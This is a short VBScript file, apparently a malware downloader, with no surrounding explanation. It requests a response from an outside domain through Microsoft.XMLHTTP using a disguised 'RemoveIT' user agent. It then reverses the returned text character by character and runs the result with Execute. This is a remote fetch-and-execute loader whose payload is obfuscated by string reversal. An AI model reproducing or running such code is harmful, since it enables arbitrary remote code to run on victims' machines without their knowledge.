Avu2r="Qh19rjosKgeH1Kb3MckMQCBmQ"
URL="http://dilaingil.info/?c=r&" & Avu2r
set ymw17=CreateObject("Microsoft.XMLHTTP")

ymw17.open "GET",URL,false
ymw17.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
ymw17.setRequestHeader "User-Agent", "RemoveIT"
ymw17.send "Z"

For i = Len(ymw17.responsetext) to 1  Step-1
    var= Mid(ymw17.responsetext,  i  , 1)
    D02HF = D02HF & var
Next

execute "Execute D02HF & Avu2rymw17"

